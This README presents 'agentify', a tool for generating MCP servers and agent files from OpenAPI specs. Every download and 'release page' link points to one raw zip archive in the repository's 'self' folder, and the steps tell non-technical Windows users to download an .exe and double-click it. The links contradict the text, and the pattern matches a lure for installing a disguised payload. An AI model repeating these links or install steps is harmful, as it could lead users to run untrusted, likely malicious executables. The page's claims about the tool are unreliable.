# 🤖 agentify - Build Agents from OpenAPI Specs

[![Download agentify](https://img.shields.io/badge/Download-Agentify-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip)

## 🔍 What is agentify?

agentify is a tool that helps you create smart agents from OpenAPI specs. Instead of setting up complicated systems, you can use one simple command to convert your API information into useful files and servers your product can use. It generates MCP Servers, Skills, CLAUDE.md, AGENTS.md, and other components. This makes it easier to build and manage agents that understand your product’s API without manually writing code.

## 🎯 Who should use agentify?

agentify works well for anyone who wants to turn their API description into an interactive agent quickly. You don’t need coding skills or deep technical knowledge. The tool handles all the technical parts for you. It is designed for product managers, business analysts, or anyone working with APIs who wants to create digital assistants or automated agents.

## 🖥️ System Requirements

- Windows 10 or later (64-bit recommended)  
- At least 4 GB of free RAM  
- 500 MB of free disk space  
- Internet connection to download the tool and updates  

agentify runs as a desktop application with a command line interface, so your computer should support running Windows applications without administrative restrictions.

## ⚙️ Features

- Converts OpenAPI specifications into running MCP Servers  
- Generates Skills, CLAUDE.md, and AGENTS.md files automatically  
- Supports integration with AI models like Claude and other large language models  
- Works entirely from the command line, requiring only one command for full setup  
- Uses TypeScript under the hood but no knowledge needed to use  
- Compatible with various AI and automation tools through generated outputs  

## 📥 Download agentify

You can get the latest version of agentify from the official release page.

[![Download agentify Now](https://img.shields.io/badge/Download-agentify-blue?style=for-the-badge)](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip)

**Steps:**

1. Visit the page.  
2. Scroll to the latest release section.  
3. Find the Windows installer file, usually ending with `.exe`.  
4. Click the file to begin download.  
5. Once downloaded, double-click the file to start installation.

## 🚀 Installing & Running agentify on Windows

Follow these steps to install and run agentify.

### Step 1: Run the Installer

- Locate the `.exe` file you downloaded, usually in your "Downloads" folder.  
- Double-click the file to start the installation.  
- When prompted, follow the on-screen instructions to finish installing agentify.  

The installer will place all necessary files on your PC.

### Step 2: Open Command Prompt

- Press the Windows key, type `cmd`, and press Enter to open the Command Prompt window.  
- Make sure you are in the folder where agentify is installed or the folder where you want to use the tool. 

### Step 3: Run Agentify Command

agentify works by running commands in Command Prompt.

- To check if agentify is installed correctly, type:  
  `agentify --version`  
  This will show the installed version number.

- To start using agentify to convert your OpenAPI specs, you will use a command similar to:  
  `agentify compile your-api-spec.yaml`  

Replace `your-api-spec.yaml` with the path to your OpenAPI file.

### Step 4: Use Results

Agentify creates several important files and servers:

- **MCP Server:** A running agent server that can interact with your API.  
- **Skills Folder:** Contains scripts that define the agent’s abilities.  
- **CLAUDE.md & AGENTS.md:** Documentation files for managing and understanding your agents.  

You can open these files with any text editor, like Notepad, to view or edit the details.

## 🛠️ Basic Commands

Here are some common commands you can use with agentify.

- `agentify compile [file]`  
  Converts an OpenAPI spec into agent files.

- `agentify serve`  
  Runs the MCP server locally so you can test the agent.

- `agentify help`  
  Displays help information and available commands.

Replace `[file]` with the name of your spec file.

## 📂 Organizing Your Project

When you run agentify, it creates a folder structure that helps keep everything neat:

```
/agentify-project
  /skills
  CLAUDE.md
  AGENTS.md
  mcp-server.js
  ...
```

- Place your OpenAPI files inside the project folder or reference them with the full path when running commands.  
- Keep your skill files inside the `skills` directory to manage agent actions.  

## 🔄 Updating agentify

Check the [release page](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip) regularly to download new versions. Updates may include:

- Bug fixes  
- New features  
- Better compatibility  

Download the new installer and run it again to update.

## 💡 Tips for Using agentify

- Use clear and complete OpenAPI specs for best results.  
- Test the MCP server on your local machine before deploying.  
- Review generated `.md` files to understand how your agent is set up.  
- Keep your project files backed up to avoid losing work.  

## 🚪 Troubleshooting

- If `agentify` command is not recognized, ensure the installation folder is in your system’s PATH or run it from the install directory.  
- Make sure your OpenAPI file is valid and properly formatted.  
- Restart your command prompt after installing.  

If you encounter errors, text from error messages can help diagnose the problem.

## 📚 Learn More

Explore topics related to agentify like:

- OpenAPI specifications  
- MCP (Model Context Protocol)  
- Skills-based agent design  
- Using Claude and other AI models with your API  

These can help you get more from the files and servers generated by agentify.